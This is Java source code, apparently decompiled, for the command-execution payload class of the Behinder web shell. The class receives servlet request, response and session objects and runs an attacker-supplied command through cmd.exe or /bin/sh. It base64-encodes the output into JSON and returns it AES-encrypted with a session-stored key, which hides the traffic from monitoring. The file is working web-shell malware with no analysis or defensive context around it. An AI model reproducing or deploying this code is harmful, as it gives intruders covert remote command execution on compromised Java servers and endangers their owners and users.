package net.rebeyond.behinder.payload.java;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;

public class Cmd {
   public static String cmd;
   public static String path;
   private static String status = "success";
   private ServletRequest Request;
   private ServletResponse Response;
   private HttpSession Session;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var11 = false;

      ServletOutputStream so = null;
      label77: {
         try {
            var11 = true;
            this.fillContext(obj);
            result.put("msg", this.RunCMD(cmd));
            result.put("status", status);
            var11 = false;
            break label77;
         } catch (Exception var15) {
            result.put("msg", var15.getMessage());
            result.put("status", "fail");
            var11 = false;
         } finally {
            if (var11) {
               try {
                  so = this.Response.getOutputStream();
                  so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.flush();
                  so.close();
               } catch (Exception var12) {
                  var12.printStackTrace();
               }

            }
         }

         try {
            so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
         } catch (Exception var13) {
            var13.printStackTrace();
         }

         return true;
      }

      try {
         so = this.Response.getOutputStream();
         so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.flush();
         so.close();
      } catch (Exception var14) {
         var14.printStackTrace();
      }

      return true;
   }

   private String RunCMD(String cmd) throws Exception {
      Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
      String result = "";
      if (cmd != null && cmd.length() > 0) {
         Process p;
         if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
         } else {
            p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
         }

         BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));

         String disr;
         for(disr = br.readLine(); disr != null; disr = br.readLine()) {
            result = result + disr + "\n";
         }

         br = new BufferedReader(new InputStreamReader(p.getErrorStream(), "GB2312"));

         for(disr = br.readLine(); disr != null; disr = br.readLine()) {
            status = "error";
            result = result + disr + "\n";
         }

         result = new String(result.getBytes(osCharset));
      }

      return result;
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getAttribute("u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = (HttpSession)objMap.get("session");
         this.Response = (ServletResponse)objMap.get("response");
         this.Request = (ServletRequest)objMap.get("request");
      }

      this.Response.setCharacterEncoding("UTF-8");
   }
}
